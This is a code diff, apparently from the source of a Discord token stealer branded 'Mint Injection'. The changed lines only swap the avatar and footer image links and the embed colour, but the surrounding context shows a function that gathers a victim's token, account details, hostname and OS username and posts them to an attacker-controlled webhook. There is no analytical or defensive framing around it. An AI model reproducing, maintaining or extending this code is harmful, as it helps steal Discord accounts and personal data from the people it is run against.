@@ -147,7 +147,7 @@ const request = async (method, url, headers, data) => {
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "Mint -  injection";
-    content["avatar_url"] = "https://media.discordapp.net/attachments/1200079639192801411/1210243873662701598/DALLE-2024-02-19-00.47.png";
+    content["avatar_url"] = "https://media.discordapp.net/attachments/1211774107012698123/1211775467829596180/DALLE_2024-02-26_21.40.25_-_Design_a_sophisticated_and_minimalist_icon_for_a_company_named_Mint_ideal_for_digital_use._The_icon_should_embody_the_essence_of_freshness_with_a_m.webp?ex=65ef6cd9&is=65dcf7d9&hm=6eec5418732f3c506124515212bf5b52f87a2f3385a9b7d32313c757882859dd&";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -156,7 +156,7 @@ const hooker = async (content, token, account) => {
     };
     content["embeds"][0]["footer"] = {
         "text": "Mint Injection | Zeubrkk",
-        "icon_url": "https://media.discordapp.net/attachments/1200079639192801411/1210243873662701598/DALLE-2024-02-19-00.47.png",
+        "icon_url": "https://media.discordapp.net/attachments/1211774107012698123/1211775467829596180/DALLE_2024-02-26_21.40.25_-_Design_a_sophisticated_and_minimalist_icon_for_a_company_named_Mint_ideal_for_digital_use._The_icon_should_embody_the_essence_of_freshness_with_a_m.webp?ex=65ef6cd9&is=65dcf7d9&hm=6eec5418732f3c506124515212bf5b52f87a2f3385a9b7d32313c757882859dd&",
     };
     content["embeds"][0]["title"] = "Account Information";
 
@@ -194,7 +194,7 @@ const hooker = async (content, token, account) => {
     });
 
     for (const embed in content["embeds"]) {
-        content["embeds"][embed]["color"] = 0xb143e3;
+        content["embeds"][embed]["color"] = 0xa6d8c2;
     }
 
     await request("POST", CONFIG.webhook, {
